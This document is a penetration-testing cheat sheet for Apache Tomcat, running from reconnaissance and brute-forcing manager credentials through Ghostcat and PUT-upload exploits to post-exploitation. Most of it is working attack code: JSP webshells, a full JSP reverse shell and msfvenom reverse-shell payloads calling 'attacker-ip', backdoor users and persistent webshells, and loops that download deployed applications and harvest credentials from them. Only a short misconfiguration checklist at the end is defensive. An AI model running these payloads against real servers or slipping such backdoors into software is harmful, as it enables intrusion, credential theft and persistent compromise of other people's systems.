# Tomcat 8080

**`Default Ports: 8080 (HTTP), 8443 (HTTPS), 8009 (AJP)`**

**Apache Tomcat** is an open-source Java Servlet Container and web server developed by the Apache Software Foundation. It implements Java Servlet, JavaServer Pages (JSP), and WebSocket specifications. Tomcat is widely used for hosting Java web applications and is a common target in enterprise environments.

### Connect <a href="#connect" id="connect"></a>

#### Using Web Browser <a href="#using-web-browser" id="using-web-browser"></a>

```
# HTTP connection
http://target.com:8080
http://192.168.1.100:8080

# HTTPS connection
https://target.com:8443

# Manager application
http://target.com:8080/manager/html
http://target.com:8080/manager/text
http://target.com:8080/manager/status

# Host Manager
http://target.com:8080/host-manager/html
```

#### Using cURL <a href="#using-curl" id="using-curl"></a>

```
# Basic request
curl http://target.com:8080

# Manager app with authentication
curl -u 'username:password' http://target.com:8080/manager/text/list

# Deploy WAR file
curl -u 'admin:password' \
  --upload-file shell.war \
  http://target.com:8080/manager/text/deploy?path=/shell

# Undeploy application
curl -u 'admin:password' \
  http://target.com:8080/manager/text/undeploy?path=/shell
```

### Recon <a href="#recon" id="recon"></a>

#### Service Detection with Nmap <a href="#service-detection-with-nmap" id="service-detection-with-nmap"></a>

Use Nmap to detect Tomcat services and identify server capabilities.

```
nmap -p 8080,8443,8009 target.com
```

#### Banner Grabbing <a href="#banner-grabbing" id="banner-grabbing"></a>

Connect to Tomcat services to gather version and service information.

**Using netcat**

```
# Using netcat
nc target.com 8080
GET / HTTP/1.1
Host: target.com
```

**Using curl**

```
# Using curl
curl -I http://target.com:8080

# Check Server header
curl -s -D - http://target.com:8080 | grep Server

# Check error pages for version
curl http://target.com:8080/nonexistent

# Check documentation pages
curl http://target.com:8080/docs/
```

**Using nmap**

```
# Version detection
nmap -p 8080,8443 -sV target.com

# HTTP methods enumeration
nmap -p 8080 --script http-methods target.com

# Directory enumeration
nmap -p 8080 --script http-enum target.com

# Tomcat-specific scripts
nmap -p 8080 --script http-tomcat-* target.com

# Server header detection
nmap -p 8080 --script http-server-header target.com
```

#### Version Detection <a href="#version-detection" id="version-detection"></a>

Identify Tomcat version and configuration details.

```
# Common version disclosure locations
http://target.com:8080/
http://target.com:8080/docs/
http://target.com:8080/examples/
http://target.com:8080/RELEASE-NOTES.txt
http://target.com:8080/docs/RELEASE-NOTES.txt
```

### Enumeration <a href="#enumeration" id="enumeration"></a>

Use various tools for detailed Tomcat enumeration and information gathering.

#### Directory Enumeration <a href="#directory-enumeration" id="directory-enumeration"></a>

Discover accessible Tomcat directories and applications.

**Using gobuster**

```
# Using gobuster
gobuster dir -u http://target.com:8080 -w /usr/share/wordlists/dirb/common.txt
```

**Using dirb**

```
# Using dirb
dirb http://target.com:8080 /usr/share/wordlists/dirb/common.txt
```

**Using ffuf**

```
# Using ffuf
ffuf -u http://target.com:8080/FUZZ -w wordlist.txt
```

**Common Tomcat Directories**

```
# Common Tomcat directories
/manager/html
/manager/text
/manager/jmxproxy
/manager/status
/host-manager/html
/admin/
/examples/
/docs/
/ROOT/
```

#### Application Enumeration <a href="#application-enumeration" id="application-enumeration"></a>

Enumerate deployed applications and their configurations.

**Manager Application Access**

```
# List deployed applications (requires auth)
curl -u 'admin:password' http://target.com:8080/manager/text/list

# Application status
curl -u 'admin:password' http://target.com:8080/manager/text/serverinfo

# Session information
curl -u 'admin:password' http://target.com:8080/manager/text/sessions?path=/app
```

**Using Metasploit**

```
use auxiliary/scanner/http/tomcat_enum
set RHOSTS target.com
set RPORT 8080
run
```

#### User Enumeration <a href="#user-enumeration" id="user-enumeration"></a>

Enumerate Tomcat users and authentication mechanisms.

**Default User Discovery**

```
# Common default users
admin
manager
tomcat
root
both
role1

# Check tomcat-users.xml (if accessible)
curl http://target.com:8080/tomcat-users.xml
curl http://target.com:8080/conf/tomcat-users.xml
```

**Brute Force Authentication**

```
# Brute force users with Metasploit
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target.com
set RPORT 8080
set USER_FILE users.txt
set PASS_FILE passwords.txt
run
```

### Attack Vectors <a href="#attack-vectors" id="attack-vectors"></a>

Exploit various Tomcat vulnerabilities and misconfigurations for unauthorized access.

#### Default Credentials <a href="#default-credentials" id="default-credentials"></a>

Test common default Tomcat credentials for unauthorized access.

```
# Common default credentials
admin:admin
tomcat:tomcat
admin:password
manager:manager
tomcat:s3cret
admin:<blank>
both:tomcat

# Try with curl
curl -u 'tomcat:tomcat' http://target.com:8080/manager/html

# Using hydra
hydra -L users.txt -P passwords.txt target.com -s 8080 http-get /manager/html
```

#### Brute Force Attack <a href="#brute-force-attack" id="brute-force-attack"></a>

Brute force Tomcat manager credentials using various tools and techniques.

**Using Metasploit**

```
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS target.com
set RPORT 8080
set USER_FILE /usr/share/wordlists/metasploit/tomcat_mgr_default_users.txt
set PASS_FILE /usr/share/wordlists/metasploit/tomcat_mgr_default_pass.txt
run
```

**Using Hydra**

```
hydra -L users.txt -P /usr/share/wordlists/rockyou.txt \
  target.com -s 8080 http-get /manager/html
```

**Using Burp Suite Intruder**

```
# Capture request to /manager/html
# Send to Intruder
# Set Authorization header as payload position
# Use Base64 encoding: username:password
```

#### WAR File Upload (Manager Access) <a href="#war-file-upload-manager-access" id="war-file-upload-manager-access"></a>

Upload malicious WAR files through Tomcat manager for code execution.

```
# Create JSP webshell
cat > shell.jsp << 'EOF'
<%@ page import="java.io.*" %>
<%
String cmd = request.getParameter("cmd");
if(cmd != null) {
    Process p = Runtime.getRuntime().exec(cmd);
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
        out.println(disr);
        disr = dis.readLine();
    }
}
%>
EOF

# Package as WAR
mkdir -p WEB-INF
jar -cvf shell.war shell.jsp WEB-INF

# Deploy using curl
curl -u 'admin:password' \
  --upload-file shell.war \
  "http://target.com:8080/manager/text/deploy?path=/shell&update=true"

# Access webshell
curl "http://target.com:8080/shell/shell.jsp?cmd=whoami"

# Using Metasploit
msfvenom -p java/jsp_shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f war > shell.war
curl -u 'admin:password' --upload-file shell.war "http://target.com:8080/manager/text/deploy?path=/shell"
```

#### PUT Method Upload (if enabled) <a href="#put-method-upload-if-enabled" id="put-method-upload-if-enabled"></a>

Upload files directly using HTTP PUT method if enabled.

```
# Test if PUT is allowed
curl -X OPTIONS http://target.com:8080/ -v

# Upload JSP shell via PUT
curl -X PUT http://target.com:8080/shell.jsp \
  -d '<%@ page import="java.io.*" %><%out.println(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream());%>'

# Access shell
curl "http://target.com:8080/shell.jsp?cmd=whoami"

# Using Metasploit
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS target.com
set RPORT 8080
run
```

#### AJP Protocol Exploitation (Ghostcat - CVE-2020-1938) <a href="#ajp-protocol-exploitation-ghostcat---cve-2020-1938" id="ajp-protocol-exploitation-ghostcat---cve-2020-1938"></a>

Exploit AJP connector vulnerabilities for file read/write access.

```
# Affects Tomcat 6, 7 < 7.0.100, 8 < 8.5.51, 9 < 9.0.31
# AJP Connector on port 8009

# Using Nmap
nmap -p 8009 --script ajp-methods,ajp-request target.com

# Read arbitrary files
python2 ajpShooter.py http://target.com:8009/ 8009 /WEB-INF/web.xml read

# Upload webshell
python2 ajpShooter.py http://target.com:8009/ 8009 /shell.jsp upload

# Using Metasploit
use auxiliary/admin/http/tomcat_ghostcat
set RHOSTS target.com
set RPORT 8009
set FILENAME /WEB-INF/web.xml
run
```

#### Path Traversal <a href="#path-traversal" id="path-traversal"></a>

Access sensitive files using path traversal techniques.

```
# Try accessing sensitive files
http://target.com:8080/../../../etc/passwd
http://target.com:8080/..;/..;/..;/etc/passwd

# Double encoding
http://target.com:8080/%252e%252e/%252e%252e/%252e%252e/etc/passwd

# URL encoding
http://target.com:8080/..%2f..%2f..%2fetc%2fpasswd

# Windows
http://target.com:8080/..\..\..\..\windows\win.ini
```

#### CVE Exploitation <a href="#cve-exploitation" id="cve-exploitation"></a>

Exploit specific Tomcat vulnerabilities for code execution.

```
# CVE-2017-12617 (Tomcat 7.0.0-7.0.79)
# PUT method RCE
curl -X PUT http://target.com:8080/shell.jsp/ -d '<%@ page import="java.io.*" %>...JSP_SHELL...'

# Using Metasploit
use exploit/multi/http/tomcat_jsp_upload_bypass
set RHOSTS target.com
run

# CVE-2019-0232 (Windows, CGI Servlet enabled)
# RCE via CGI servlet
http://target.com:8080/cgi-bin/test.bat?&dir

# CVE-2020-1938 (Ghostcat)
# Already covered in AJP section
```

### Post-Exploitation <a href="#post-exploitation" id="post-exploitation"></a>

Extract sensitive data and establish persistent access after successful Tomcat exploitation.

#### Reverse Shell <a href="#reverse-shell" id="reverse-shell"></a>

Establish reverse shell connections for persistent access.

```
<!-- JSP reverse shell -->
<%@ page import="java.io.*,java.net.*" %>
<%
String host = "attacker-ip";
int port = 4444;
Socket socket = new Socket(host, port);
Process process = Runtime.getRuntime().exec("/bin/bash");
InputStream is = process.getInputStream();
OutputStream os = process.getOutputStream();
InputStream sis = socket.getInputStream();
OutputStream sos = socket.getOutputStream();
DataInputStream dis = new DataInputStream(sis);
DataOutputStream dos = new DataOutputStream(sos);
byte[] buffer = new byte[8192];
int length;
while((length = is.read(buffer, 0, buffer.length)) > 0) {
    dos.write(buffer, 0, length);
    dos.flush();
}
while((length = sis.read(buffer, 0, buffer.length)) > 0) {
    os.write(buffer, 0, length);
    os.flush();
}
process.destroy();
socket.close();
%>
```

#### Persistence <a href="#persistence" id="persistence"></a>

Create persistent backdoor access to compromised Tomcat servers.

```
# Add backdoor user in tomcat-users.xml
curl -u 'admin:password' \
  -X PUT \
  -d '<user username="backdoor" password="P@ssw0rd123!" roles="manager-gui,admin-gui"/>' \
  http://target.com:8080/conf/tomcat-users.xml

# Deploy persistent webshell
curl -u 'admin:password' \
  --upload-file shell.war \
  "http://target.com:8080/manager/text/deploy?path=/system&update=true"

# Modify existing application
# Add JSP backdoor to existing WAR
unzip existing.war
echo '<% Runtime.getRuntime().exec(request.getParameter("c")); %>' > backdoor.jsp
jar -uvf existing.war backdoor.jsp
# Redeploy
```

#### Credential Harvesting <a href="#credential-harvesting" id="credential-harvesting"></a>

Extract credentials and sensitive configuration data.

```
# Read tomcat-users.xml
curl http://target.com:8080/WEB-INF/../conf/tomcat-users.xml

# Or via AJP Ghostcat
python ajpShooter.py http://target.com:8009/ 8009 /WEB-INF/../conf/tomcat-users.xml read

# Read web.xml for database credentials
curl http://target.com:8080/WEB-INF/web.xml

# Check for configuration files
/conf/server.xml
/conf/tomcat-users.xml
/conf/context.xml
/WEB-INF/web.xml
```

#### Data Exfiltration <a href="#data-exfiltration" id="data-exfiltration"></a>

Extract and exfiltrate sensitive data from compromised Tomcat servers.

```
# List and download WAR files
curl -u 'admin:password' http://target.com:8080/manager/text/list

# Download application
curl -u 'admin:password' \
  http://target.com:8080/manager/text/download?path=/app \
  -o app.war

# Extract and analyze
unzip app.war
grep -r "password\|secret\|key" .

# Database connection strings
grep -r "jdbc:" .
grep -r "datasource" WEB-INF/
```

#### Privilege Escalation <a href="#privilege-escalation" id="privilege-escalation"></a>

Escalate privileges on compromised Tomcat servers.

```
# Check Tomcat running user
<%@ page import="java.io.*" %>
<% out.println(System.getProperty("user.name")); %>

# If running as root/system, you have full access
# Upload tools for privilege escalation
msfvenom -p linux/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f elf > privesc

# Or Windows
msfvenom -p windows/x64/shell_reverse_tcp LHOST=attacker-ip LPORT=4444 -f exe > privesc.exe

# Upload via webshell
# Execute with elevated privileges if possible
```

#### Lateral Movement <a href="#lateral-movement" id="lateral-movement"></a>

Expand access to other systems in the network.

```
# Enumerate network from compromised Tomcat
<%@ page import="java.io.*" %>
<%
Process p = Runtime.getRuntime().exec("ifconfig");
// Or ipconfig on Windows
BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
String line;
while ((line = reader.readLine()) != null) {
    out.println(line + "<br>");
}
%>

# Scan internal network
<%@ page import="java.net.*" %>
<%
for(int i=1; i<255; i++) {
    try {
        InetAddress addr = InetAddress.getByName("192.168.1." + i);
        if(addr.isReachable(1000)) {
            out.println("Host " + addr + " is reachable<br>");
        }
    } catch(Exception e) {}
}
%>
```

#### Data Exfiltration <a href="#data-exfiltration-1" id="data-exfiltration-1"></a>

Extract and exfiltrate sensitive data from compromised systems.

```
# Extract configuration files
curl -u 'admin:password' http://target.com:8080/manager/text/serverinfo

# Download all deployed applications
for app in $(curl -s -u 'admin:password' http://target.com:8080/manager/text/list | grep -o 'path="[^"]*"' | cut -d'"' -f2); do
  curl -u 'admin:password' "http://target.com:8080/manager/text/download?path=$app" -o "${app#/}.war"
done

# Extract credentials from all WAR files
for war in *.war; do
  unzip -q "$war" -d "${war%.war}"
  grep -r -i "password\|secret\|key\|token" "${war%.war}/" >> extracted_credentials.txt
done
```

### Common Tomcat Files and Paths <a href="#common-tomcat-files-and-paths" id="common-tomcat-files-and-paths"></a>

| Path                     | Description           | Security Impact        |
| ------------------------ | --------------------- | ---------------------- |
| `/manager/html`          | Web-based manager     | Application deployment |
| `/manager/text`          | Text-based manager    | Scriptable management  |
| `/host-manager/html`     | Virtual host manager  | Host configuration     |
| `/conf/tomcat-users.xml` | User configuration    | Credential storage     |
| `/conf/server.xml`       | Server configuration  | Service configuration  |
| `/conf/web.xml`          | Default web config    | Application settings   |
| `/logs/catalina.out`     | Main log file         | Information disclosure |
| `/webapps/`              | Application directory | Deployed applications  |
| `/WEB-INF/web.xml`       | App configuration     | Database credentials   |

### Useful JSP Payloads <a href="#useful-jsp-payloads" id="useful-jsp-payloads"></a>

```
<!-- Command execution -->
<%@ page import="java.io.*" %>
<% out.println(Runtime.getRuntime().exec(request.getParameter("cmd")).getInputStream()); %>

<!-- File browser -->
<%@ page import="java.io.File" %>
<%
File f = new File(request.getParameter("dir"));
File[] files = f.listFiles();
for(File file : files) {
    out.println(file.getName() + (file.isDirectory() ? "/" : "") + "<br>");
}
%>

<!-- File reader -->
<%@ page import="java.io.*" %>
<%
BufferedReader br = new BufferedReader(new FileReader(request.getParameter("file")));
String line;
while((line = br.readLine()) != null) {
    out.println(line + "<br>");
}
%>

<!-- File upload -->
<%@ page import="java.io.*" %>
<%
FileOutputStream fos = new FileOutputStream(request.getParameter("path"));
fos.write(request.getParameter("content").getBytes());
fos.close();
%>
```

### Useful Tools <a href="#useful-tools" id="useful-tools"></a>

| Tool       | Description             | Primary Use Case        |
| ---------- | ----------------------- | ----------------------- |
| curl       | HTTP client             | Manager API interaction |
| msfvenom   | Payload generator       | WAR file creation       |
| Metasploit | Exploitation framework  | Automated exploitation  |
| Burp Suite | Web proxy               | Request manipulation    |
| ajpShooter | AJP exploitation        | Ghostcat exploitation   |
| Nmap       | Network scanner         | Service detection       |
| gobuster   | Directory brute-forcer  | Enumeration             |
| hydra      | Credential brute-forcer | Authentication attacks  |

### Security Misconfigurations to Test <a href="#security-misconfigurations-to-test" id="security-misconfigurations-to-test"></a>

* ❌ Default credentials (tomcat:tomcat, admin:admin)
* ❌ Manager application accessible externally
* ❌ Weak authentication
* ❌ AJP connector exposed (port 8009)
* ❌ PUT method enabled
* ❌ Outdated Tomcat version
* ❌ Verbose error messages
* ❌ Example applications not removed
* ❌ Directory listing enabled
* ❌ Running as root/SYSTEM
* ❌ Sensitive files accessible (tomcat-users.xml)
* ❌ No HTTPS (using HTTP on port 8080)

<br>
